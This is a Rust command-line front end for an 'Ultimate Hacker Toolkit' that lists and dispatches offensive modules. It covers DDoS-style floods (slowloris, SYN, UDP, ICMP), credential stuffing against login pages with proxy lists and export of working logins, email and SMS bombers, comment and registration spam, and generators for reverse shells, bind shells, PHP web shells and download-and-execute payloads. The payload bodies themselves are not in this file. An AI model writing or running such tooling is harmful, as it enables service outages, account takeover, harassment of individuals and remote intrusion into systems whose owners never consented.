//! Command-line interface for Ultimate Hacker Toolkit
//! Supports all modules: scan, stress, credential stuffing, spam, payload, report.

use clap::{Parser, Subcommand};
use ultimate_hacker_toolkit::*;
use std::fs;
use tokio;
use mimalloc::MiMalloc;

#[global_allocator]
static  GLOBAL: MiMalloc = MiMalloc;
#[derive(Parser)]
#[command(name = "htool")]
#[command(about = "Ultimate Hacker Toolkit - All-in-one security testing", long_about = None)]
#[command(version = "3.0.0")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Run a vulnerability scan (port, SQLi, XSS, dir brute, subdomains, SSL, headers, CVE)
    Scan {
        /// Target URL or IP address (e.g., https://example.com)
        target: String,
        /// Scan mode: quick or full
        #[arg(short, long, default_value = "quick")]
        mode: String,
        /// Rate limit in requests per second
        #[arg(short, long, default_value = "10")]
        rate: u32,
        /// Proxy URL (e.g., http://127.0.0.1:8080)
        #[arg(short, long)]
        proxy: Option<String>,
        /// Path to custom wordlist file (one entry per line)
        #[arg(short, long)]
        wordlist: Option<String>,
        /// Timeout in seconds for each request
        #[arg(short, long, default_value = "8")]
        timeout: u64,
        /// Output HTML report file path
        #[arg(short, long)]
        output: Option<String>,
    },
    /// Stress test / DDoS simulation
    Stress {
        /// Target URL or IP:port
        target: String,
        /// Attack type: http, http-random, slowloris, udp, syn, advanced, icmp
        #[arg(short, long, default_value = "http")]
        attack: String,
        /// Number of threads / concurrent connections
        #[arg(short, long, default_value = "100")]
        threads: usize,
        /// Duration in seconds
        #[arg(short, long, default_value = "30")]
        duration: u64,
        /// Proxy URL (optional)
        #[arg(short, long)]
        proxy: Option<String>,
    },
    /// Credential stuffing against a login endpoint
    CredStuff {
        /// Login URL (POST endpoint)
        login_url: String,
        /// Username field name
        #[arg(long, default_value = "username")]
        user_field: String,
        /// Password field name
        #[arg(long, default_value = "password")]
        pass_field: String,
        /// Path to username wordlist file
        #[arg(short, long)]
        users: String,
        /// Path to password wordlist file
        #[arg(short, long)]
        passes: String,
        /// Number of concurrent threads
        #[arg(short, long, default_value = "10")]
        threads: usize,
        /// Proxy list file (one per line)
        #[arg(long)]
        proxies: Option<String>,
        /// Success indicator text (e.g., "dashboard")
        #[arg(long, default_value = "dashboard")]
        success_text: String,
        /// Failure indicator text (e.g., "invalid")
        #[arg(long, default_value = "invalid")]
        fail_text: String,
        /// Output file for successful credentials
        #[arg(short, long)]
        output: Option<String>,
    },
    /// Spam / flooding attacks
    Spam {
        #[command(subcommand)]
        spam_cmd: SpamCommands,
    },
    /// Generate payloads (reverse/bind shells, web shells)
    Payload {
        /// Payload type: reverse, bind, webshell, downloadexec
        #[arg(short, long)]
        payload_type: String,
        /// Target platform: linux, windows, python, php, nodejs, ruby, perl
        #[arg(short, long)]
        platform: String,
        /// LHOST for reverse shell
        #[arg(short, long)]
        lhost: Option<String>,
        /// LPORT for reverse/bind shell
        #[arg(short, long)]
        lport: Option<u16>,
        /// URL for download and execute payload
        #[arg(short, long)]
        url: Option<String>,
        /// Password for web shell (auto-generated if omitted)
        #[arg(short, long)]
        password: Option<String>,
        /// Output file (optional)
        #[arg(short, long)]
        output: Option<String>,
    },
    /// Generate HTML/JSON report from saved scan result JSON
    Report {
        /// Path to JSON scan result file
        input: String,
        /// Output HTML file path
        #[arg(short, long)]
        output: Option<String>,
    },
}

#[derive(Subcommand)]
enum SpamCommands {
    /// Flood a database endpoint with random inserts
    DbFlood {
        /// Target endpoint URL (e.g., http://example.com/insert)
        endpoint: String,
        /// Number of requests to send
        #[arg(short, long, default_value = "100")]
        count: usize,
        /// Number of concurrent threads
        #[arg(short, long, default_value = "10")]
        threads: usize,
        /// Proxy URL (optional)
        #[arg(short, long)]
        proxy: Option<String>,
        /// Rate limit (requests per second)
        #[arg(short, long, default_value = "20")]
        rate: u32,
    },
    /// Email bomber (simulated)
    EmailBomb {
        /// Target email address
        email: String,
        /// Email subject
        subject: String,
        /// Email body template (use __NUM__ for increment)
        body: String,
        /// Number of emails to send
        #[arg(short, long, default_value = "50")]
        count: usize,
        /// Number of concurrent threads
        #[arg(short, long, default_value = "10")]
        threads: usize,
        /// Rate limit
        #[arg(short, long, default_value = "5")]
        rate: u32,
    },
    /// SMS bomber (simulated)
    SmsBomb {
        /// Target phone number
        phone: String,
        /// SMS message template
        message: String,
        /// Number of SMS to send
        #[arg(short, long, default_value = "50")]
        count: usize,
        /// Number of concurrent threads
        #[arg(short, long, default_value = "10")]
        threads: usize,
        /// API key (optional, for real SMS gateway)
        #[arg(short, long)]
        api_key: Option<String>,
    },
    /// Comment spam on a blog or forum
    CommentSpam {
        /// Target URL (where the comment form submits)
        url: String,
        /// Name of the comment field
        #[arg(long, default_value = "comment")]
        comment_field: String,
        /// Name of the name field
        #[arg(long, default_value = "name")]
        name_field: String,
        /// Name of the email field
        #[arg(long, default_value = "email")]
        email_field: String,
        /// Comment template (use __NUM__)
        #[arg(long, default_value = "Great post! #__NUM__")]
        template: String,
        /// Number of comments
        #[arg(short, long, default_value = "100")]
        count: usize,
        /// Threads
        #[arg(short, long, default_value = "10")]
        threads: usize,
        /// Proxy
        #[arg(short, long)]
        proxy: Option<String>,
        /// Rate limit
        #[arg(short, long, default_value = "10")]
        rate: u32,
    },
    /// Registration spam on vulnerable signup pages
    RegSpam {
        /// Signup URL
        url: String,
        /// Number of registrations
        #[arg(short, long, default_value = "50")]
        count: usize,
        /// Threads
        #[arg(short, long, default_value = "5")]
        threads: usize,
        /// Proxy
        #[arg(short, long)]
        proxy: Option<String>,
        /// Rate limit
        #[arg(short, long, default_value = "5")]
        rate: u32,
    },
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    match cli.command {
        Commands::Scan { target, mode, rate, proxy, wordlist, timeout, output } => {
            let scan_type = if mode == "full" { ScanType::Full } else { ScanType::Quick };
            let wordlist_vec = if let Some(wl) = wordlist {
                load_wordlist(Some(&wl))
            } else {
                load_wordlist(None)
            };
            let config = ScannerConfig {
                scan_type,
                rate_limit_rps: rate,
                proxy,
                wordlist: wordlist_vec,
                timeout_secs: timeout,
                user_agent: utils::random_user_agent(),
            };
            println!("🔍 Starting scan on {}", target);
            let result = run_full_scan(target, config, None).await;
            let out_file = output.unwrap_or_else(|| format!("scan_{}.html", result.target.replace('.', "_")));
            if out_file.ends_with(".html") || out_file.ends_with(".htm") {
                let _ = save_html_report(&result, &out_file);
            } else {
                let _ = save_json_report(&result, &out_file);
            }
            println!("✅ Scan completed. Report saved to {}", out_file);
        }
        Commands::Stress { target, attack, threads, duration, proxy } => {
            println!("💥 Starting stress test on {} with {} threads for {} sec", target, threads, duration);
            let count = stress::launch_stress_test(&target, &attack, threads, duration, proxy.as_deref()).await;
            match count {
                Ok(c) => println!("✅ Stress test completed. {} requests/connections sent.", c),
                Err(e) => println!("❌ Stress test failed: {}", e),
            }
        }
        Commands::CredStuff { login_url, user_field, pass_field, users, passes, threads, proxies, success_text, fail_text, output } => {
            let usernames = load_wordlist_from_file(&users);
            let passwords = load_wordlist_from_file(&passes);
            let proxy_vec = if let Some(p) = proxies { Some(load_proxy_list(&p)) } else { None };
            let config = CredStuffConfig {
                login_url,
                username_field: user_field,
                password_field: pass_field,
                extra_fields: vec![],
                success_indicator: Some(success_text),
                failure_indicator: Some(fail_text),
                threads,
                proxy_list: proxy_vec,
                rate_limit_rps: 10,
                timeout_secs: 10,
                user_agent: utils::random_user_agent(),
            };
            println!("🚀 Starting credential stuffing with {} users, {} passwords", usernames.len(), passwords.len());
            let results = credential_stuffing(&config, usernames, passwords, None).await;
            let successful: Vec<_> = results.iter().filter(|r| r.success).collect();
            println!("✅ Done. Successful: {}/{}", successful.len(), results.len());
            if let Some(out) = output {
                let _ = save_successful_logins(&results, &out);
                println!("Saved successful credentials to {}", out);
            }
        }
        Commands::Spam { spam_cmd } => {
            match spam_cmd {
                SpamCommands::DbFlood { endpoint, count, threads, proxy, rate } => {
                    let limiter = create_rate_limiter(rate);
                    let fields = vec![("data", "__RANDOM__"), ("timestamp", "__RANDOM_NUMBER__")];
                    let sent = flood_database(&endpoint, &fields, count, threads, proxy.as_deref(), limiter).await;
                    println!("💣 Database flood completed. {} inserts sent.", sent);
                }
                SpamCommands::EmailBomb { email, subject, body, count, threads, rate } => {
                    let limiter = create_rate_limiter(rate);
                    let sent = email_bomber(&email, &subject, &body, count, threads, None, limiter).await;
                    println!("📧 Email bomber completed. {} emails sent (simulated).", sent);
                }
                SpamCommands::SmsBomb { phone, message, count, threads, api_key } => {
                    let limiter = create_rate_limiter(5);
                    let sent = sms_bomber(&phone, &message, count, threads, api_key.as_deref(), limiter).await;
                    println!("📱 SMS bomber completed. {} messages sent (simulated).", sent);
                }
                SpamCommands::CommentSpam { url, comment_field, name_field, email_field, template, count, threads, proxy, rate } => {
                    let limiter = create_rate_limiter(rate);
                    let posted = comment_spam(&url, &comment_field, &name_field, &email_field, &template, count, threads, proxy.as_deref(), limiter).await;
                    println!("💬 Comment spam completed. {} comments posted.", posted);
                }
                SpamCommands::RegSpam { url, count, threads, proxy, rate } => {
                    let fields = vec![
                        ("username", "__USERNAME__"),
                        ("email", "__EMAIL__"),
                        ("password", "__PASSWORD__"),
                    ];
                    let limiter = create_rate_limiter(rate);
                    let created = registration_spam(&url, &fields, count, threads, proxy.as_deref(), limiter).await;
                    println!("📝 Registration spam completed. {} accounts created.", created);
                }
            }
        }
        Commands::Payload { payload_type, platform, lhost, lport, url, password, output } => {
            let plat = match platform.as_str() {
                "linux" => Platform::Linux,
                "windows" => Platform::Windows,
                "macos" => Platform::MacOS,
                "python" => Platform::Python,
                "php" => Platform::PHP,
                "nodejs" => Platform::NodeJS,
                "ruby" => Platform::Ruby,
                "perl" => Platform::Perl,
                _ => { println!("❌ Unknown platform"); return; }
            };
            let payload_str = match payload_type.as_str() {
                "reverse" => {
                    if let (Some(ip), Some(port)) = (lhost, lport) {
                        generate_reverse_shell(&ip, port, plat)
                    } else {
                        println!("❌ Reverse shell requires --lhost and --lport");
                        return;
                    }
                }
                "bind" => {
                    if let Some(port) = lport {
                        generate_bind_shell(port, plat)
                    } else {
                        println!("❌ Bind shell requires --lport");
                        return;
                    }
                }
                "webshell" => {
                    if plat == Platform::PHP {
                        let pass = password.unwrap_or_else(|| random_webshell_password());
                        generate_php_webshell(&pass)
                    } else {
                        println!("❌ Webshell only supported for PHP platform");
                        return;
                    }
                }
                "downloadexec" => {
                    if let Some(dl_url) = url {
                        generate_download_exec(&dl_url, plat)
                    } else {
                        println!("❌ Download/exec requires --url");
                        return;
                    }
                }
                _ => {
                    println!("❌ Unknown payload type. Use: reverse, bind, webshell, downloadexec");
                    return;
                }
            };
            if let Some(out) = output {
                fs::write(&out, &payload_str).expect("Failed to write payload");
                println!("✅ Payload saved to {}", out);
            } else {
                println!("{}", payload_str);
            }
        }
        Commands::Report { input, output } => {
            let json_data = fs::read_to_string(&input).expect("Failed to read input file");
            let result: ScanResult = serde_json::from_str(&json_data).expect("Invalid JSON format");
            let out_path = output.unwrap_or_else(|| "report.html".to_string());
            let _ = save_html_report(&result, &out_path);
            println!("✅ Report generated: {}", out_path);
        }
    }
}